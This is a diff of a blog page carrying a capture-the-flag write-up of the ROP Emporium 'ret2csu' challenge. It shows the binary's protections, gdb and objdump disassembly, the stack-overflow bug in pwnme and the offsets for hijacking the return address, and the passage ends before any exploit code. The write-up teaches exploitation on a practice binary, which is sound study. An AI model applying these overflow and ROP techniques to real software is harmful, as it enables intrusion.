@@ -1,20 +1,38 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=''><title>Return-Oriented Programming - Retcsu</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Introduction Challenge description
+ We&amp;rsquo;re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website https://ropemporium.com
+ After downloading the binary, check the enabled protections and mitigation&amp;rsquo;s. Only NX and Partial RELRO protections are turned on as shown below.'><title>Return-Oriented Programming - Retcsu</title>
 
 <link rel='canonical' href='https://thuri10.github.io/p/return-oriented-programming-retcsu/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Return-Oriented Programming - Retcsu'>
-<meta property='og:description' content=''>
+<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css"><meta property='og:title' content='Return-Oriented Programming - Retcsu'>
+<meta property='og:description' content='Introduction Challenge description
+ We&amp;rsquo;re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website https://ropemporium.com
+ After downloading the binary, check the enabled protections and mitigation&amp;rsquo;s. Only NX and Partial RELRO protections are turned on as shown below.'>
 <meta property='og:url' content='https://thuri10.github.io/p/return-oriented-programming-retcsu/'>
 <meta property='og:site_name' content='Solar Bits'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ropemprium' /><meta property='article:tag' content='rop' /><meta property='article:tag' content='pwn' /><meta property='article:published_time' content='2021-12-20T20:50:44&#43;03:00'/><meta property='article:modified_time' content='2021-12-20T20:50:44&#43;03:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='rop' /><meta property='article:tag' content='pwn' /><meta property='article:tag' content='ropemporium' /><meta property='article:published_time' content='2021-12-20T20:50:44&#43;03:00'/><meta property='article:modified_time' content='2021-12-20T20:50:44&#43;03:00'/><meta property='og:image' content='https://thuri10.github.io/post/ropemporium/retcsu.jpg' />
 <meta name="twitter:title" content="Return-Oriented Programming - Retcsu">
-<meta name="twitter:description" content="">
+<meta name="twitter:description" content="Introduction Challenge description
+ We&amp;rsquo;re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website https://ropemporium.com
+ After downloading the binary, check the enabled protections and mitigation&amp;rsquo;s. Only NX and Partial RELRO protections are turned on as shown below."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://thuri10.github.io/post/ropemporium/retcsu.jpg' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-DC4ZP2YRDZ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-DC4ZP2YRDZ', { 'anonymize_ip': false });
+}
+</script>
+
     </head>
     <body class="
-    article-page 
+    article-page has-toc
 ">
     <script>
         (function() {
@@ -40,195 +58,34 @@
 </script>
 <div class="container main-container flex 
     
-        on-phone--column extended
+        extended
     
 ">
     
-        <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu82c25fa98cd4e9a8103220017be4b8cb_139991_300x0_resize_box_3.png" width="300"
-                            height="276" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🥷</span>
-                
-            </figure>
-            
-        
-        
-        <h1 class="site-name"><a href="/">Solar Bits</a></h1>
-        <h2 class="site-description">Bit Flipping.</h2><ol class="social-menu">
-                
-                    <li>
-                        <a 
-                            href='https://github.com/thuri10'
-                            target="_blank"
-                            title="GitHub"
-                        >
-                            
-                            
-                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
-
-
-
-                            
-                        </a>
-                    </li>
-                
-                    <li>
-                        <a 
-                            href='https://twitter.com/0xhexski'
-                            target="_blank"
-                            title="Twitter"
-                        >
-                            
-                            
-                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
-</svg>
-
-
-
-                            
-                        </a>
-                    </li>
-                
-            </ol></header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/' target="_blank">
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+  <polyline points="15 6 9 12 15 18" />
 </svg>
 
 
 
-                
-                <span>Home</span>
+                <span>Back</span>
             </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/about/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>Dark Mode</span>
-            </li>
-        
-    </ol>
-</aside>
-
+        </div>
     
 <main class="main full-width">
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/return-oriented-programming-retcsu/">
+                
+                    <img src="/post/ropemporium/retcsu.jpg" loading="lazy" alt="Featured image of post Return-Oriented Programming - Retcsu" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
@@ -267,7 +124,7 @@
 
 
                 <time class="article-time--reading">
-                    0 minute read
+                    11 minute read
                 </time>
             </div>
         
@@ -277,7 +134,323 @@
 </header>
 
     <section class="article-content">
-    
+    <h2 id="introduction">Introduction</h2>
+<p>Challenge description</p>
+<blockquote>
+<p>We&rsquo;re back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them?
+The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website <a class="link" href="https://ropemporium.com"  target="_blank" rel="noopener"
+    >https://ropemporium.com</a></p>
+</blockquote>
+<p>After downloading the binary, check the enabled protections and mitigation&rsquo;s. Only <strong>NX</strong> and Partial RELRO protections are turned on as shown below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabledrop
+    PIE:      No PIE <span style="color:#5bc4bf">(</span>0x400000<span style="color:#5bc4bf">)</span>
+</code></pre></div><p>First step is to find the vulnerability in the binary that will enable us to subvert the program execution control flow. From the disassembly of the main function we are only calling <strong>pwnme</strong> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) di<span style="color:#ef6155">sas</span> <span style="color:#ef6155">main</span>
+<span style="color:#06b6ef">Dump</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">code</span> <span style="color:#ef6155">for</span> <span style="color:#ef6155">function</span> <span style="color:#ef6155">main</span>:
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400607</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">push</span>   rbp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400608</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rbp,rsp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040060b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">4</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400500</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">pwnme@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400610</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">9</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    eax,<span style="color:#f99b15">0x0</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400615</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">14</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">pop</span>    rbp
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400616</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">15</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">ret</span>    
+<span style="color:#06b6ef">End</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">dump.</span>
+</code></pre></div><p>The function reference the got table in order to load the actual address of pwnme function from <strong>libret2csu.so</strong> library after the first call.</p>
+<h2 id="pwnme-disassembly">pwnme Disassembly</h2>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) di<span style="color:#ef6155">sas</span> <span style="color:#ef6155">pwnme</span>
+<span style="color:#06b6ef">Dump</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">code</span> <span style="color:#ef6155">for</span> <span style="color:#ef6155">function</span> <span style="color:#ef6155">pwnme</span>:
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000093a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">push</span>   rbp
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000093b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rbp,rsp
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000093e</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">4</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">sub</span>    rsp,<span style="color:#f99b15">0x20</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000942</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">8</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rax,<span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x201697</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0x201fe0</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000949</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">15</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rax,<span style="color:#fec418">QWORD</span> <span style="color:#ef6155">PTR</span> [rax]
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000094c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">18</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    ecx,<span style="color:#f99b15">0x0</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000951</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">23</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edx,<span style="color:#f99b15">0x2</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000956</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">28</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    esi,<span style="color:#f99b15">0x0</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000095b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">33</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rdi,rax
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000095e</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">36</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x820</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">setvbuf@plt</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000963</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">41</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rdi,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x31e</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0xc88</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000096a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">48</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x7a0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000096f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">53</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rdi,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x32a</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0xca0</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000976</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">60</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x7a0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000097b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">65</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rax,[rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x20</span>]
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000097f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">69</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edx,<span style="color:#f99b15">0x20</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000984</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">74</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    esi,<span style="color:#f99b15">0x0</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000989</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">79</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rdi,rax
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000098c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">82</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x7d0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">memset@plt</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000991</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">87</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rdi,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x310</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0xca8</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000000998</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">94</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x7a0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000000099d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">99</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rdi,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x36e</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0xd12</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009a4</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">106</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    eax,<span style="color:#f99b15">0x0</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009a9</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">111</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x7c0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">printf@plt</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009ae</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">116</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rax,[rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x20</span>]
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009b2</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">120</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edx,<span style="color:#f99b15">0x200</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009b7</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">125</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    rsi,rax
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009ba</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">128</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">mov</span>    edi,<span style="color:#f99b15">0x0</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009bf</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">133</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x7f0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">read@plt</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009c4</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">138</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">lea</span>    rdi,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x34a</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">0xd15</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009cb</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">145</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x7a0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009d0</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">150</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">nop</span>
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009d1</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">151</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">leave</span>  
+  <span style="color:#ef6155">0</span><span style="color:#06b6ef">x00000000000009d2</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">152</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">ret</span>    
+<span style="color:#06b6ef">End</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">dump.</span>
+<span style="color:#ef6155">(</span><span style="color:#06b6ef">gdb</span>) 
+</code></pre></div><p>From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size 32bytes. we are reading  <strong>0x200</strong> from the standard input file descriptor, which is more than the buffer size.
+The c equivalent of the above vulnerability is,</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">read(<span style="color:#f99b15">0</span>, <span style="color:#5bc4bf">*</span>(rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x20</span>), <span style="color:#f99b15">0x200</span>) <span style="color:#ef6155">#</span>reading <span style="color:#f99b15">0x200</span> from the stdin
+</code></pre></div><p>For exploitation purpose, is to control the return address of the pwnme function and redirect the execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.</p>
+<p><figure 
+	>
+	<a href="/post/ropemporium/stack.png" >
+		<img src="/post/ropemporium/stack.png"
+			
+			
+			
+			loading="lazy"
+			alt="ret control">
+	</a>
+	
+	<figcaption>ret control</figcaption>
+	
+</figure></p>
+<p>From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the <strong>NX</strong> execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.</p>
+<h2 id="__libc_csu_init__-disassembly"><strong>libc_csu_init</strong> Disassembly</h2>
+<p>Below is the disassembled code for <strong>__libc_csu_init</strong> section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#ef6155">0000000000400640</span> <span style="color:#ef6155">&lt;</span><span style="color:#06b6ef">__libc_csu_init</span><span style="color:#5bc4bf">&gt;</span>:
+  <span style="color:#ef6155">400640:</span>	<span style="color:#ef6155">41</span> <span style="color:#ef6155">57</span>                	<span style="color:#06b6ef">push</span>   <span style="color:#ef6155">r15</span>
+  <span style="color:#ef6155">400642:</span>	<span style="color:#ef6155">41</span> <span style="color:#ef6155">56</span>                	<span style="color:#06b6ef">push</span>   <span style="color:#ef6155">r14</span>
+  <span style="color:#ef6155">400644:</span>	<span style="color:#ef6155">49</span> <span style="color:#ef6155">89</span> <span style="color:#06b6ef">d7</span>             	<span style="color:#ef6155">mov</span>    <span style="color:#ef6155">r15</span>,rdx
+  <span style="color:#ef6155">400647:</span>	<span style="color:#ef6155">41</span> <span style="color:#ef6155">55</span>                	<span style="color:#06b6ef">push</span>   <span style="color:#ef6155">r13</span>
+  <span style="color:#ef6155">400649:</span>	<span style="color:#ef6155">41</span> <span style="color:#ef6155">54</span>                	<span style="color:#06b6ef">push</span>   <span style="color:#ef6155">r12</span>
+  <span style="color:#ef6155">40064</span>b:	<span style="color:#ef6155">4</span><span style="color:#06b6ef">c</span> <span style="color:#f99b15">8</span><span style="color:#ef6155">d</span> <span style="color:#f99b15">25</span> <span style="color:#f99b15">9</span><span style="color:#ef6155">e</span> <span style="color:#f99b15">07</span> <span style="color:#f99b15">20</span> <span style="color:#f99b15">00</span> 	<span style="color:#ef6155">lea</span>    <span style="color:#ef6155">r12</span>,[<span style="color:#ef6155">rip</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x20079e</span>]        <span style="color:#ef6155">#</span> <span style="color:#f99b15">600</span><span style="color:#ef6155">df0</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">__frame_dummy_init_array_entry</span><span style="color:#5bc4bf">&gt;</span>
